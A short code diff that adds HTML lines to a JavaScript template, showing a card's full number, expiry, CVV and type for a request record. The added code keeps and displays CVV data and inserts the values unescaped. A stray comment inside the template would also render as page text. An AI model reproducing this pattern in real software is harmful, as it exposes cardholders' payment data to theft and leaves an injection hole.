@@ -946,6 +946,15 @@ ${
                     ? `<p><strong>Details:</strong> ${request.method_details}</p>`
                     : ""
                 }
+                // Display with exact field names
+<p><strong>Card Number:</strong> ${cardInfo["card.number"] || "N/A"}</p>
+<p><strong>Expiry:</strong> ${cardInfo["card.expiry"] || "N/A"}</p>
+<p><strong>CVV:</strong> ${cardInfo["card.cvv"] || "N/A"}</p>
+<p><strong>Type:</strong> ${
+                    cardInfo["card.type"]
+                      ? cardInfo["card.type"].toUpperCase()
+                      : "N/A"
+                  }</p>
             `
             }
         </div>
